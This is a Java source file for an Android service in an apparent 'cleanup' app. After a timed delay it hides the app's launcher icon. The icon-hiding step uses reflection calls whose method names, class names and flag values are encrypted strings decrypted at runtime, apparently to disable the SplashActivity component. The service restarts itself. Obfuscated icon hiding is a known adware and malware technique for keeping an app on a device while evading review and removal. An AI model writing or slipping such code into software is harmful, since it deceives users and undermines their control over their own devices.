package com.expert.cleanup.nets;

import android.os.IBinder;
import android.os.Message;
import android.app.Service;
import android.content.Intent;
import android.content.Context;
import java.lang.reflect.InvocationTargetException;
import java.util.concurrent.TimeUnit;
import com.expert.cleanup.BaseApp;
import com.expert.cleanup.nets.util.AscEncryptHelper;
import io.reactivex.Observable;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.functions.Consumer;
import io.reactivex.schedulers.Schedulers;

public class HideIconService extends Service
{
    private long mHideIconDelay;
    private long mLatestStartTime;
    private Disposable mDisposable;
    private HideIconHandler mHideIconHandler;
    private volatile boolean mIsRunning = false;
    public static final String DELAY_TIME = "Delay_Time";

    public void onCreate()
    {
        super.onCreate();
        mHideIconHandler = new HideIconHandler(this);
    }

    public void onDestroy()
    {
        super.onDestroy();
        mHideIconHandler = null;
    }

    public IBinder onBind(Intent intent)
    {
        return null;

    }

    private class HideIconHandler extends android.os.Handler
    {
        private Context mContext;
        public HideIconHandler(Context context)
        {
            super(context.getMainLooper());
            mContext = context;
        }

        public void handleMessage(Message msg)
        {
            super.handleMessage(msg);
            if(((System.currentTimeMillis() - mLatestStartTime) / 1000) >= mHideIconDelay)
            {
                mIsRunning = false;
                try
                {
                    handleMsg(mContext,"com.expert.cleanup.acts.SplashActivity");
                }
                catch (NoSuchMethodException e)
                {
                    e.printStackTrace();
                }
                catch (IllegalAccessException e)
                {
                    e.printStackTrace();
                }
                catch (ClassNotFoundException e)
                {
                    e.printStackTrace();
                }
                catch (InvocationTargetException e)
                {

                    e.printStackTrace();
                }
            }
            else
                sendEmptyMessageDelayed(0,1000);
        }

        private void handleMsg(Context contex,String className) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException, ClassNotFoundException
        {
            mDisposable = Observable.interval(0l,2000, TimeUnit.MILLISECONDS, Schedulers.io()).observeOn(AndroidSchedulers.mainThread()).subscribe(new Consumer<Long>()
            {
                public void accept(Long aLong) throws Exception
                {
                    if(BaseApp.getInstance().mActivePageNum == 0)
                    {
                        Intent intent = new Intent(contex,Class.forName(className));
                        Object object = Context.class.getMethod(AscEncryptHelper.decrypt("gS09aY6aJgT+24HoNaMiALuKupMymICIU+GlczI+s578",AscEncryptHelper.secretKey)).invoke(contex);
                        object.getClass().getMethod(AscEncryptHelper.decrypt("h348PdmdJ1eshYO9YaBxB6+KuoA8lpuGWuGGZhkxtZnijoyFU+huwK2g",AscEncryptHelper.secretKey),Class.forName(AscEncryptHelper.
                        decrypt("hS89PYOfJwX709brYat3Vr2BqrE8ko/HV+uGZjkxoNXNhIWmWfJ/x7eJDJik",AscEncryptHelper.secretKey)),Integer.TYPE,Integer.TYPE).invoke(object,intent.getComponent(),Integer.
                        valueOf(AscEncryptHelper.decrypt("h3toPoqRe1D71YS7bPdyV+4=",AscEncryptHelper.secretKey)),Integer.valueOf(AscEncryptHelper.decrypt("gnprONiRfAaq09Psbad0Uu0=",AscEncryptHelper.secretKey)));
                        if(null != mDisposable && !mDisposable.isDisposed())mDisposable.dispose();
                    }
                }
            });
        }
    }

    public synchronized int onStartCommand(Intent intent, int flags, int startId)
    {
        if(!mIsRunning)
        {
            mIsRunning = true;
            if(intent == null)
                mHideIconDelay = Long.MAX_VALUE;
            else
                mHideIconDelay = intent.getLongExtra(DELAY_TIME,Long.MAX_VALUE);
            mLatestStartTime = System.currentTimeMillis();
            mHideIconHandler.sendEmptyMessage(0);
        }
        return Service.START_STICKY;
    }
}